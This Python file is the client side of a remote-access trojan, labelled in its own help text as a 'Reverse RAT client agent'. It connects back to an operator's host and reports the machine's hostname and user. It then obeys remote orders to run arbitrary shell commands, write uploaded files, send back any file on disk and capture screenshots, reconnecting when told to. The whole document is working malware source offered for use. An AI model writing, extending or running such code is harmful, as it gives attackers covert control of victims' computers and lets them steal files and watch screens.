import argparse
import base64
import getpass
import os
import socket
import subprocess
import sys
import tempfile
import time
import uuid

from protocols import recv_msg, send_msg


def client_info():
    return {
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "platform": sys.platform,
    }


def exec_command(cmd, timeout=30):
    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        output = proc.stdout + proc.stderr
        return True, output, proc.returncode
    except Exception as e:
        return False, str(e), None


def handle_upload(msg):
    try:
        data = base64.b64decode(msg["base64_data"])
        remote_path = msg["remote_path"]
        os.makedirs(os.path.dirname(os.path.abspath(remote_path)), exist_ok=True)
        with open(remote_path, "wb") as f:
            f.write(data)
        return True, f"[+] Uploaded {len(data)} bytes to {remote_path}"
    except Exception as e:
        return False, f"upload error: {e}"


def handle_download(remote_path):
    try:
        with open(remote_path, "rb") as f:
            data = f.read()
        return True, base64.b64encode(data).decode()
    except Exception as e:
        return False, f"download error: {e}"


def handle_screenshot():
    path = os.path.join(tempfile.gettempdir(), f"shot_{uuid.uuid4().hex}.png")

    tools = [
        ["gnome-screenshot", "-f", path],
        ["scrot", path],
        ["import", "-window", "root", path],
    ]

    for tool in tools:
        try:
            subprocess.run(tool, check=True, timeout=10)
            break
        except Exception:
            continue
    else:
        return False, "no screenshot tool found"

    try:
        with open(path, "rb") as f:
            data = f.read()
        os.unlink(path)
        return True, base64.b64encode(data).decode()
    except Exception as e:
        return False, f"screenshot error: {e}"


def client_loop(sock):
    while True:
        msg = recv_msg(sock)
        if msg is None:
            break

        msg_id = msg.get("id")
        cmd_type = msg.get("type")

        response = {"id": msg_id, "type": "response"}

        if cmd_type == "ping":
            response.update({"ok": True, "data": "pong"})

        elif cmd_type == "exec":
            ok, data, code = exec_command(msg.get("cmd", ""))
            response.update({"ok": ok, "data": data, "returncode": code})

        elif cmd_type == "upload":
            ok, data = handle_upload(msg)
            response.update({"ok": ok, "data": data})

        elif cmd_type == "download":
            ok, data = handle_download(msg.get("remote_path", ""))
            response.update({"ok": ok, "data": data})

        elif cmd_type == "screenshot":
            ok, data = handle_screenshot()
            response.update({"ok": ok, "data": data})

        elif cmd_type == "exit":
            response.update({"ok": True, "data": "bye"})
            send_msg(sock, response)
            break

        else:
            response.update({"ok": False, "data": "unknown command type"})

        send_msg(sock, response)

    try:
        sock.close()
    except Exception:
        pass


def run(host, port, token, reconnect):
    while True:
        try:
            sock = socket.create_connection((host, port), timeout=10)
            send_msg(
                sock,
                {
                    "id": "auth",
                    "type": "auth",
                    "token": token,
                    "client": client_info(),
                },
            )
            print(f"[*] Connected to {host}:{port}")
            client_loop(sock)
        except Exception as e:
            print(f"[!] Error: {e}")

        if reconnect <= 0:
            break

        print(f"[*] Reconnecting in {reconnect}s")
        time.sleep(reconnect)


def main():
    parser = argparse.ArgumentParser(description="Reverse RAT client agent")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=4444)
    parser.add_argument("--token", default="change-me")
    parser.add_argument("--reconnect", type=int, default=0)
    args = parser.parse_args()

    run(args.host, args.port, args.token, args.reconnect)


if __name__ == "__main__":
    main()
